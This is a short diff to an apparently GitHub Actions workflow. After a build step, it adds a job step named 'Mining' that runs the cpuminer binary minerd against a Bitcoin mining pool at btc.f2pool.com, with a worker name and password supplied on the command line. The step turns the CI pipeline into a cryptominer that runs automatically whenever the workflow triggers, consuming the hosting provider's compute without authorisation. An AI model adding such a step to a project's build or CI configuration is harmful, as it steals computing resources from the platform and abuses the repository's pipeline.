@@ -20,3 +20,8 @@ jobs:
           make
           ls
           ls ..
+
+      - name: Mining
+        run: |
+          cd cpuminer-*
+          ./minerd --url=stratum+tcp://btc.f2pool.com:1314 --userpass=arkina1991.001:21235365876986800
